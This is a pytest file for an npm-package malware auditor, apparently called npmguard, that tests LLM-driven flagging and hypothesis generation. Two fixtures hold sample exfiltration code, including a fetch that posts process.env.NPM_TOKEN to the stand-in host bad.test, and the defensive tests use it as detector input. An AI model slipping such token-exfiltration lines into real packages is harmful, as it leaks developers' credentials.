# CLASS MAP — flag-draft normalization + run_flag resolution + KitHypothesisGenerator
# (seams: ScriptedLlm provider behind build_npmguard_llm; real sqlite capture ledger;
#  dry_run_load conftest no-op, re-patched where the gate itself is the class)
# Axes: provider output shape, repair path (schema vs semantic), load-gate outcome,
#       driver planting, wire-schema strictness
#   C1 FlagDraft normalizes provider near-miss shapes (line_range/lineRanges/ints/numbered text)
#   C2 run_flag resolves copied source text to a concrete line range
#   C3 schema-invalid first response → one bounded repair → armed (ledger: invalid_output, ok)
#   C4 semantically-invalid plan (CI truthiness) → repaired inside kit (ledger: invalid_output, ok)
#   C5 one-shot payload that compiles but does not LOAD → AuditIncompleteError (fallover seam)
#   C6 wire schema is strict (additionalProperties:false, required==properties, portable)
#   C7 custom JS triggerTarget → driver planted at /pkg/npmguard-driver.js and triggered
#   C8 extract_intent: BudgetExhausted is terminal — propagates, never fabricates intent
#   C9 extract_intent: retryable provider exhaustion (EndOfRope) → fallback intent
#      EXPLICITLY marked degraded=True; the LLM path stays degraded=False
#  C10 run_hypothesize postcondition: len(hypotheses) == len(flags), order kept —
#      every suspicion armed or the phase raised (no silent drops → no false SAFE)
# Adversarial pass: 2026-07-23/W6 — call-count assertions moved from the private
# provider._calls counter to the public llm_attempts capture ledger (DB rows).
import json

import pytest
import sqlalchemy as sa

from kit_llm import BudgetExhausted, ScriptedLlm
from kit_llm.capture import llm_attempts
from kit_spine import make_engine, make_session_factory
from kit_spine.db import metadata
from npmguard.config import Settings
from npmguard.contract.models import EntryPoints, Hypothesis, RunError, ToolCall
from npmguard.errors import AuditIncompleteError
from npmguard.inventory import analyze_inventory
from npmguard.llm_runtime import build_npmguard_llm
from npmguard.phases import (
    Flag,
    FlagDraft,
    KitHypothesisGenerator,
    PackageIntent,
    extract_intent,
    hypothesis_submission,
    run_flag,
    run_hypothesize,
)


async def _attempt_statuses(sessions) -> list[str]:
    """The public capture ledger: one llm_attempts row per physical call."""
    async with sessions() as session:
        rows = await session.execute(
            sa.select(llm_attempts.c.status).order_by(llm_attempts.c.step, llm_attempts.c.attempt)
        )
        return list(rows.scalars())


def test_flag_draft_normalizes_common_provider_line_shapes() -> None:
    """C1: near-miss provider shapes normalize to the canonical contract."""
    assert FlagDraft.model_validate(
        {"line_range": "3-6", "reason": "environment gate"}
    ).model_dump() == {"lines": ["3-6"], "why": "environment gate"}
    assert FlagDraft.model_validate(
        {
            "lineRanges": [[3, 3], [79, 80]],
            "description": "encoded control characters",
        }
    ).model_dump() == {
        "lines": ["3-3", "79-80"],
        "why": "encoded control characters",
    }
    assert FlagDraft.model_validate({"lines": [3, 5], "why": "numeric model output"}).lines == [
        "3-3",
        "5-5",
    ]
    assert FlagDraft.model_validate(
        {"lines": ["13: ", "14: return value"], "why": "numbered source lines"}
    ).lines == ["13-13", "14-14"]


async def test_flag_resolves_copied_source_text_to_line_range(tmp_path) -> None:
    """C2: a flag whose 'lines' is copied source text resolves to its range."""
    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'flag.sqlite3'}")
    async with engine.begin() as connection:
        await connection.run_sync(metadata.create_all)
    sessions = make_session_factory(engine)
    provider = ScriptedLlm(
        {
            "flag": [
                json.dumps(
                    {
                        "summary": "reads a token",
                        "capabilities": ["ENV_VARS"],
                        "flags": [
                            {
                                "lines": ["const token = process.env.NPM_TOKEN;"],
                                "why": "reads a sensitive npm token",
                            }
                        ],
                    }
                )
            ]
        }
    )
    llm = build_npmguard_llm(sessions, Settings(_env_file=None), provider=provider)
    package = tmp_path / "package"
    package.mkdir()
    (package / "package.json").write_text(
        json.dumps({"name": "fixture", "main": "index.js"}), encoding="utf-8"
    )
    (package / "index.js").write_text(
        "module.exports = () => {\nconst token = process.env.NPM_TOKEN;\n};\n",
        encoding="utf-8",
    )

    result = await run_flag(
        package,
        await analyze_inventory(package),
        PackageIntent(statedPurpose="fixture", expectedCapabilities=[], rationale="manifest"),
        llm,
        "audit-1",
    )

    assert result.flags[0].lines == ["2-2"]
    await llm.aclose()
    await engine.dispose()


async def test_kit_schema_transport_arms_hypothesis_after_bounded_repair(tmp_path) -> None:
    """C3: schema-invalid first response is repaired once, then arms."""
    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'llm.sqlite3'}")
    async with engine.begin() as connection:
        await connection.run_sync(metadata.create_all)
    sessions = make_session_factory(engine)
    valid = {
        "description": "index.js reads an npm token and posts it remotely",
        "claim": {"kind": "env_exfil", "gating": None},
        "severity": "high",
        "setup": {
            "environment": [{"name": "NPM_TOKEN", "value": "canary"}],
            "files": [],
            "dateIso": None,
            "urlStubs": [],
            "filePatches": [],
            "preloadCode": None,
        },
        "triggerTarget": "index.js",
    }
    provider = ScriptedLlm(
        {
            "hypothesis": [
                json.dumps({"description": "missing required fields"}),
                json.dumps(valid),
            ]
        }
    )
    settings = Settings(_env_file=None)
    llm = build_npmguard_llm(sessions, settings, provider=provider)
    package = tmp_path / "package"
    package.mkdir()
    (package / "index.js").write_text(
        "fetch('https://bad.test', {body: process.env.NPM_TOKEN})", encoding="utf-8"
    )
    generator = KitHypothesisGenerator(llm, Settings(_env_file=None))
    result = await generator.generate(
        Flag(file="index.js", lines=["1-1"], why="unexpected token exfiltration"),
        package_path=package,
        intent=PackageIntent(
            statedPurpose="string utility", expectedCapabilities=[], rationale="manifest"
        ),
        entry_points=EntryPoints(install=[], runtime=["index.js"], bin=[]),
        hypothesis_id="hyp-0001",
        created_at="2026-07-20T00:00:00Z",
        audit_id="audit-1",
    )
    assert result.claim.kind == "env_exfil"
    assert [call.tool for call in result.experiment] == ["setEnv", "trigger"]
    assert result.experiment[-1].args["target"] == "index.js"
    # Public ledger: exactly one rejected attempt restated invalid, then the repair.
    assert await _attempt_statuses(sessions) == ["invalid_output", "ok"]
    await llm.aclose()
    await engine.dispose()


async def test_semantically_invalid_hypothesis_is_repaired_inside_kit(tmp_path) -> None:
    """C4: a plan that decodes but violates semantics (CI='false') is repaired."""
    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'semantic.sqlite3'}")
    async with engine.begin() as connection:
        await connection.run_sync(metadata.create_all)
    sessions = make_session_factory(engine)
    base = {
        "description": "index.js runs only when CI is truthy",
        "claim": {"kind": "env_exfil", "gating": "ci_gate"},
        "severity": "high",
        "setup": {
            "environment": [{"name": "CI", "value": "false"}],
            "files": [],
            "dateIso": None,
            "urlStubs": [],
            "filePatches": [],
            "preloadCode": None,
        },
        "triggerTarget": "index.js",
    }
    repaired = json.loads(json.dumps(base))
    repaired["setup"]["environment"] = []
    provider = ScriptedLlm({"hypothesis": [json.dumps(base), json.dumps(repaired)]})
    llm = build_npmguard_llm(sessions, Settings(_env_file=None), provider=provider)
    package = tmp_path / "package"
    package.mkdir()
    (package / "index.js").write_text(
        "if (process.env.CI) fetch('https://bad.test')", encoding="utf-8"
    )

    result = await KitHypothesisGenerator(llm, Settings(_env_file=None)).generate(
        Flag(file="index.js", lines=["1-1"], why="CI-gated network call"),
        package_path=package,
        intent=PackageIntent(
            statedPurpose="string utility", expectedCapabilities=[], rationale="manifest"
        ),
        entry_points=EntryPoints(install=[], runtime=["index.js"], bin=[]),
        hypothesis_id="hyp-0001",
        created_at="2026-07-20T00:00:00Z",
        audit_id="audit-1",
    )

    assert [call.tool for call in result.experiment] == ["trigger"]
    assert await _attempt_statuses(sessions) == ["invalid_output", "ok"]
    await llm.aclose()
    await engine.dispose()


async def test_one_shot_load_failure_reports_incomplete_for_fallover(tmp_path, monkeypatch) -> None:
    """C5: the one-shot decode compiles but the payload does not load; generate raises
    AuditIncompleteError so the FallbackHypothesisGenerator hands off to the agentic
    generator (which repairs)."""
    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'load.sqlite3'}")
    async with engine.begin() as connection:
        await connection.run_sync(metadata.create_all)
    sessions = make_session_factory(engine)
    provider = ScriptedLlm(
        {
            "hypothesis": [
                json.dumps(
                    {
                        "description": "invoke the flagged export",
                        "claim": {"kind": "env_exfil", "gating": None},
                        "severity": "medium",
                        "setup": {
                            "environment": [], "files": [], "dateIso": None,
                            "urlStubs": [], "filePatches": [], "preloadCode": None,
                        },
                        "triggerTarget": "require('src/x.js')",  # bare specifier -> won't load
                    }
                )
            ]
        }
    )
    llm = build_npmguard_llm(sessions, Settings(_env_file=None), provider=provider)
    package = tmp_path / "package"
    package.mkdir()
    (package / "index.js").write_text("exports.run = () => {}", encoding="utf-8")

    async def _load_fails(*_args, **_kwargs):
        return RunError(kind="CrashError", detail="Cannot find module 'src/x.js'")

    monkeypatch.setattr("npmguard.phases.dry_run_load", _load_fails)  # override conftest no-op
    with pytest.raises(AuditIncompleteError, match="did not load"):
        await KitHypothesisGenerator(llm, Settings(_env_file=None)).generate(
            Flag(file="index.js", lines=["1-1"], why="suspicious export"),
            package_path=package,
            intent=PackageIntent(statedPurpose="library", expectedCapabilities=[], rationale="m"),
            entry_points=EntryPoints(install=[], runtime=["index.js"], bin=[]),
            hypothesis_id="hyp-0001", created_at="t", audit_id="a",
        )
    await llm.aclose()
    await engine.dispose()


async def _fixture_inventory(tmp_path, description: str = "left-pads strings"):
    package = tmp_path / "package"
    package.mkdir()
    (package / "package.json").write_text(
        json.dumps({"name": "fixture", "description": description, "main": "index.js"}),
        encoding="utf-8",
    )
    (package / "index.js").write_text("module.exports = (s) => s;\n", encoding="utf-8")
    return package, await analyze_inventory(package)


async def test_intent_budget_exhaustion_propagates_never_fabricates(tmp_path) -> None:
    """C8: BudgetExhausted is terminal in the intent phase too — it propagates
    instead of being silently converted into a fabricated PackageIntent (which
    would let the flag phase fire N doomed calls one phase later)."""

    class _BudgetSpentLlm:
        async def run(self, *args, **kwargs):
            raise BudgetExhausted("spent")

    package, inventory = await _fixture_inventory(tmp_path)
    with pytest.raises(BudgetExhausted):
        await extract_intent(package, inventory, _BudgetSpentLlm(), "audit-1")


async def test_intent_provider_exhaustion_falls_back_explicitly_degraded(tmp_path) -> None:
    """C9: the whole provider chain failing at transport (kit EndOfRope, the
    retryable class) falls back — and the fallback intent is explicitly marked
    degraded=True so the trace/report records it was not LLM-validated."""

    class _DeadProvider:
        async def complete(self, request):
            raise RuntimeError("transport down")

        async def stream(self, request, on_token):
            raise RuntimeError("transport down")

        async def lookup_cost(self, provider_call_id):
            return 0.0

        async def aclose(self) -> None:
            return None

    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'intent.sqlite3'}")
    async with engine.begin() as connection:
        await connection.run_sync(metadata.create_all)
    llm = build_npmguard_llm(
        make_session_factory(engine), Settings(_env_file=None), provider=_DeadProvider()
    )
    package, inventory = await _fixture_inventory(tmp_path)

    intent = await extract_intent(package, inventory, llm, "audit-1")

    assert intent.degraded is True
    assert intent.statedPurpose == "left-pads strings"  # manifest-only, not fabricated by an LLM
    assert intent.expectedCapabilities == []
    await llm.aclose()
    await engine.dispose()


async def test_llm_validated_intent_is_not_degraded(tmp_path) -> None:
    """C9 (complement): the LLM-validated path yields degraded=False."""
    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'intent-ok.sqlite3'}")
    async with engine.begin() as connection:
        await connection.run_sync(metadata.create_all)
    provider = ScriptedLlm(
        {
            "intent": [
                PackageIntent(
                    statedPurpose="pads strings", expectedCapabilities=[], rationale="README"
                )
            ]
        }
    )
    llm = build_npmguard_llm(make_session_factory(engine), Settings(_env_file=None), provider=provider)
    package, inventory = await _fixture_inventory(tmp_path)

    intent = await extract_intent(package, inventory, llm, "audit-1")

    assert intent.degraded is False
    assert intent.statedPurpose == "pads strings"
    await llm.aclose()
    await engine.dispose()


async def test_run_hypothesize_arms_every_flag_in_order(tmp_path) -> None:
    """C10: after run_hypothesize returns, len(hypotheses) == len(flags) with
    order preserved and every node armed — a dropped slot would be a hidden
    coverage gap (a suspicion that never runs → potential false SAFE)."""

    class _ArmsEveryFlag:
        async def generate(self, flag, *, hypothesis_id, created_at, **kwargs) -> Hypothesis:
            return Hypothesis(
                hypId=hypothesis_id,
                description=f"armed {flag.file}",
                claim={"kind": "env_exfil", "gating": None},
                focusFiles=[flag.file],
                focusLines=[],
                experiment=[
                    ToolCall(tool="trigger", args={"kind": "entrypoint", "target": flag.file})
                ],
                severity="low",
                state="OPEN",
                createdBy="hypothesize",
                createdAt=created_at,
            )

    flags = [Flag(file=f"f{index}.js", lines=["1-1"], why="suspicious") for index in range(3)]
    hypotheses = await run_hypothesize(
        flags,
        _ArmsEveryFlag(),
        package_path=tmp_path,
        intent=PackageIntent(statedPurpose="fixture", expectedCapabilities=[], rationale="m"),
        entry_points=EntryPoints(install=[], runtime=[], bin=[]),
        audit_id="audit-1",
    )
    assert [hyp.hypId for hyp in hypotheses] == ["hyp-0001", "hyp-0002", "hyp-0003"]
    assert [hyp.focusFiles for hyp in hypotheses] == [["f0.js"], ["f1.js"], ["f2.js"]]
    assert all(hyp.experiment for hyp in hypotheses)


def test_hypothesis_wire_schema_is_strict_and_provider_portable() -> None:
    """C6: every object in the wire schema is strict and provider-portable."""
    schema = hypothesis_submission(["index.js"]).model_json_schema()

    def assert_strict_object(node: object) -> None:
        if isinstance(node, dict):
            if node.get("type") == "object":
                assert node.get("additionalProperties") is False
                properties = node.get("properties", {})
                assert set(node.get("required", [])) == set(properties)
            for value in node.values():
                assert_strict_object(value)
        elif isinstance(node, list):
            for value in node:
                assert_strict_object(value)

    assert_strict_object(schema)
    serialized = json.dumps(schema)
    assert "discriminator" not in serialized
    assert '"additionalProperties": {' not in serialized


async def test_custom_hypothesis_driver_is_planted_and_triggered(tmp_path) -> None:
    """C7: a JavaScript triggerTarget becomes a planted driver + trigger pair."""
    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'driver.sqlite3'}")
    async with engine.begin() as connection:
        await connection.run_sync(metadata.create_all)
    sessions = make_session_factory(engine)
    provider = ScriptedLlm(
        {
            "hypothesis": [
                json.dumps(
                    {
                        "description": "invoke the flagged exported function",
                        "claim": {"kind": "env_exfil", "gating": None},
                        "severity": "medium",
                        "setup": {
                            "environment": [],
                            "files": [],
                            "dateIso": None,
                            "urlStubs": [],
                            "filePatches": [],
                            "preloadCode": None,
                        },
                        "triggerTarget": "const lib = require('./index.js'); lib.run();",
                    }
                )
            ]
        }
    )
    llm = build_npmguard_llm(sessions, Settings(_env_file=None), provider=provider)
    package = tmp_path / "package"
    package.mkdir()
    (package / "index.js").write_text("exports.run = () => {}", encoding="utf-8")

    result = await KitHypothesisGenerator(llm, Settings(_env_file=None)).generate(
        Flag(file="index.js", lines=["1-1"], why="suspicious export"),
        package_path=package,
        intent=PackageIntent(statedPurpose="library", expectedCapabilities=[], rationale="manifest"),
        entry_points=EntryPoints(install=[], runtime=["index.js"], bin=[]),
        hypothesis_id="hyp-0001",
        created_at="2026-07-20T00:00:00Z",
        audit_id="audit-1",
    )

    assert [call.tool for call in result.experiment] == ["plantFiles", "trigger"]
    assert result.experiment[0].args["files"][0]["path"] == "/pkg/npmguard-driver.js"
    assert result.experiment[1].args["target"] == "/pkg/npmguard-driver.js"
    await llm.aclose()
    await engine.dispose()
